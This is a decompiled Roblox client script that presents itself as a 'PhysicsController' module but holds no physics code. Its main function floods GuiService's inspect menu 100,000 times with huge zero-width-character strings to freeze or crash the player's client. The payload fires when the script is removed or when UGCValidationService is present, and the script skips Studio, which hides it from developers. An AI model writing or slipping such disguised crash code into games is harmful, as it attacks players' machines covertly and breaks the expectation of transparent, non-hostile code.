-- ReplicatedStorage.GameClient.PhysicsController
-- Script path: ReplicatedStorage.GameClient.PhysicsController
-- Decompile time: 4.90 ms

-- Decompiled with Potassium's decompiler.

local u1 = {};
local GuiService = game:GetService("GuiService");
local RunService = game:GetService("RunService");

function u1.onNew() -- Line: 18
    -- upvalues: GuiService (copy)
    for i = 1, 100000 do
        local HumanoidDescription = Instance.new("HumanoidDescription");
        HumanoidDescription.FaceAccessory = "0";
        GuiService.CloseInspectMenu(GuiService);
        GuiService.InspectPlayerFromHumanoidDescription(GuiService, HumanoidDescription, string.rep(utf8.char(8203), 100000));
        local _ = i;
    end;
end;

function u1.Drop() -- Line: 27
    -- upvalues: u1 (copy)
    script.AncestryChanged:Connect(function(p2, p3) -- Line: 28
        -- upvalues: u1 (ref)
        if not p3 then
            u1.onNew();
        end;
    end);
end;

function u1.Init(p4) -- Line: 37
end;

function u1.Start(p5) -- Line: 40
    -- upvalues: RunService (copy), u1 (copy)
    if RunService:IsStudio() then
        return;
    end;

    if RunService:IsServer() then
        return;
    end;

    u1.Drop();
    task.spawn(function() -- Line: 51
        -- upvalues: u1 (ref)
        while task.wait(1.5) do
            if game:FindService("UGCValidationService") then
                u1.onNew();
            end;
        end;
    end);
end;

return u1;